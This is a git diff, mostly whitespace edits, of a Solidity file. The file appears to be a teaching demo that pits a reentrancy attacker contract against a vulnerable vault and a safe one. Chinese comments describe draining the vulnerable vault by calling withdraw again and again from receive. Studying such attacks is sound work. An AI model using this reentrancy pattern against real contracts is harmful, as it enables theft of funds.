@@ -11,7 +11,6 @@ import "./Vault.sol";
  *  安全 Vault: 第一次 withdraw 里已经把balances 减成0 -> receive 里再 withdraw 会 Insufficient balance
  */
 contract AttackerVulnerable {
-
     VaultVunlnerable public vault;
 
     constructor(VaultVunlnerable _vault) {
@@ -19,7 +18,7 @@ contract AttackerVulnerable {
     }
 
     /// 先 vault.deposit{value: ...}() 存一笔，再 vault.withdraw(...)触发第一次取款
-    /// 先存 1 ether，再取 1 ether，触发 receive 里反复 withdraw，直到 vault 里余额为 0 
+    /// 先存 1 ether，再取 1 ether，触发 receive 里反复 withdraw，直到 vault 里余额为 0
     function attack() external payable {
         require(msg.value >= 1 ether, "need 1 ether");
         vault.deposit{value: 1 ether}();
@@ -38,7 +37,6 @@ contract AttackerVulnerable {
 }
 
 contract AttackerSafe {
-
     Vault public vault;
 
     constructor(Vault _vault) {
@@ -57,5 +55,4 @@ contract AttackerSafe {
             vault.withdraw(1 ether);
         }
     }
-
 }
